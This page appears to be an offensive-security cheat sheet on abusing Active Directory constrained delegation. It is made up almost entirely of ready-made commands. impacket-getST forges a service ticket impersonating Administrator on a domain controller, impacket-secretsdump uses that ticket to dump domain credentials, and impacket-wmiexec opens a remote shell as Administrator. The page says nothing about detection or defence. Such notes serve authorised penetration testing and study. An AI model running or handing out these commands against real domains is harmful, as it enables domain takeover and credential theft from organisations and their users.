# AllowedToDelegate



The constrained delegation feature allows a user account to act as any user for certain services specified in the msds-AllowedToDelegateTo LDAP property on a target computer. This means an account with this permission can impersonate anyone, including Domain Admins, for those services on the target machine.&#x20;

## Get Service Ticket

{% code title="With password" overflow="wrap" %}
```bash
impacket-getST -k -impersonate Administrator -spn 'cifs/DC1.DOMAIN.corp'   'DOMAIN/OWNED_USER'
```
{% endcode %}

{% code title="With NTLM" overflow="wrap" %}
```bash
impacket-getST -k -impersonate Administrator -spn 'cifs/DC1.DOMAIN.corp'   'DOMAIN/OWNED_USER' -hashes :NT_HASH
```
{% endcode %}



## Dump credentials with ST

{% code overflow="wrap" %}
```bash
# set the new ST
export KRB5CCNAME=NAME.ccache

# use ST to use secretdump
impacket-secretsdump -no-pass -k -dc-ip $DC_IP $DOMAIN.local/$NAME@$MACHINE.$DOMAIN.local
```
{% endcode %}



## Connect with WMI

```bash
export KRB5CCNAME=Administrator@cifs.ccache

impacket-wmiexec FQDN/Administrator@DOMAIN.local -k -no-pass
```
